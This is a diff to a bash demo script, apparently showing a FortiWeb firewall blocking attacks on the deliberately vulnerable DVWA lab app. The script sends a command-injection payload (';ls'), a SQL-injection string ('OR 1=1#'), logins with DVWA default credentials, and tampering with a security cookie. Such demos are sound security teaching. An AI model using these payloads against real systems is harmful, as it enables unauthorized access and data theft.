@@ -298,8 +298,8 @@ GREEN='\033[00;32m'
 GREEN_BOLD='\033[1;32m'
 YELLOW='\033[00;33m'
 YELLOW_BOLD='\033[1;33m'
-BLUE='\033[00;34m'
-BLUE_BOLD='\033[1;34m'
+CYAN_BOLD='\033[00;34m'
+CYAN_BOLD_BOLD='\033[1;34m'
 PURPLE='\033[00;35m'
 PURPLE_BOLD='\033[1;35m'
 CYAN='\033[00;36m'
@@ -353,7 +353,7 @@ Command_Injection() {
     echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/vulnerabilities/exec/${RESTORE} submit=${RED_BOLD}\";ls\""
     echo ""
     curl -s "${DVWA_URL}/vulnerabilities/exec/" \
-        -H "authority: dvwa.corp.fabriclab.ca" \
+        -H "authority: ${DVWA_HOST}" \
         -H "cache-control: max-age=0" \
         -H "content-type: application/x-www-form-urlencoded" \
         -H "origin: ${DVWA_URL}" \
@@ -375,7 +375,7 @@ SQL_Injection() {
     echo ""
     echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/login.php${RESTORE} username=${YELLOW_BOLD}gordonb${RESTORE} password=${YELLOW_BOLD}abc123${RESTORE}\n"
     curl "${DVWA_URL}/login.php" \
-        -H "authority: dvwa.corp.fabriclab.ca" \
+        -H "authority: ${DVWA_HOST}" \
         -H "cache-control: max-age=0" \
         -H "content-type: application/x-www-form-urlencoded" \
         -H "origin: ${DVWA_URL}" \
@@ -385,9 +385,9 @@ SQL_Injection() {
         --data-raw "username=gordonb&password=abc123&Login=Login" \
         -c cookie.txt
 
-    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/vulnerabilities/sqli/${RESTORE} id=${RED}\"'OR 1=1#\"\n"
+    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/vulnerabilities/sqli/${RESTORE} id=${RED_BOLD}\"'OR 1=1#\"\n"
     curl -s "${DVWA_URL}/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit" \
-        -H "authority: dvwa.corp.fabriclab.ca" \
+        -H "authority: ${DVWA_HOST}" \
         -H "cache-control: max-age=0" \
         -H "content-type: application/x-www-form-urlencoded" \
         -H "origin: ${DVWA_URL}" \
@@ -403,31 +403,36 @@ SQL_Injection() {
 }
 
 Cookie_Security() {
-    echo -e "\nCookie Security\n"
-    echo -e "Connecting to ${BLUE}${DVWA_URL}/login.php${RESTORE} username=${BLUE}smithy${RESTORE} password=${BLUE}password${RESTORE}\n"
-    curl '${DVWA_URL}/login.php' \
-        -H 'authority: dvwa.corp.fabriclab.ca' \
-        -H 'cache-control: max-age=0' \
-        -H 'content-type: application/x-www-form-urlencoded' \
-        -H 'origin: ${DVWA_URL}' \
-        -H 'referer: ${DVWA_URL}/' \
-        -H 'user-agent: FortiWeb Demo Script' \
+    echo ""
+    echo -e "Cookie Security"
+    echo ""
+    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/login.php${RESTORE} username=${CYAN_BOLD}smithy${RESTORE} password=${CYAN_BOLD}password${RESTORE}"
+    echo ""
+    curl "${DVWA_URL}/login.php" \
+        -H "authority: ${DVWA_HOST}" \
+        -H "cache-control: max-age=0" \
+        -H "content-type: application/x-www-form-urlencoded" \
+        -H "origin: ${DVWA_URL}" \
+        -H "referer: ${DVWA_URL}/" \
+        -H "user-agent: FortiWeb Demo Script" \
         --insecure \
-        --data-raw 'username=smithy&password=password&Login=Login' \
+        --data-raw "username=smithy&password=password&Login=Login" \
         -c cookie.txt
 
-    echo -e "We have 3 cookies. Security Cookie = ${RED}low${RESTORE}.\n"
-    grep dvwa.corp.fabriclab.ca cookie.txt
-    echo -e "\nLet's change the value to ${RED}medium${RESTORE}. Press enter to continue... "
+    echo -e "We have 3 cookies. Security Cookie = ${RED_BOLD}low${RESTORE}."
+    echo ""
+    grep $DVWA_HOST cookie.txt
+    echo ""
+    echo -e "Let's change the value to ${RED_BOLD}medium${RESTORE}. Press enter to continue... "
     read response
     sed -i 's/low/medium/' cookie.txt
-    grep dvwa.corp.fabriclab.ca cookie.txt
-    echo -e "\nNow that we've changed the security level, let's connect again to the server. Press enter to continue... "
+    grep $DVWA_HOST cookie.txt
+    echo ""
+    echo -e "Now that we've changed the security level, let's connect again to the server. Press enter to continue... "
     read response
-
-    echo -e "Connecting to ${BLUE}${DVWA_URL}/security.php\n${RED}"
+    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/security.php\n${RED}"
     curl -s '${DVWA_URL}/security.php' \
-        -H 'authority: dvwa.corp.fabriclab.ca' \
+        -H 'authority: ${DVWA_HOST}' \
         -H 'cache-control: max-age=0' \
         -H 'content-type: application/x-www-form-urlencoded' \
         -H 'origin: ${DVWA_URL}' \
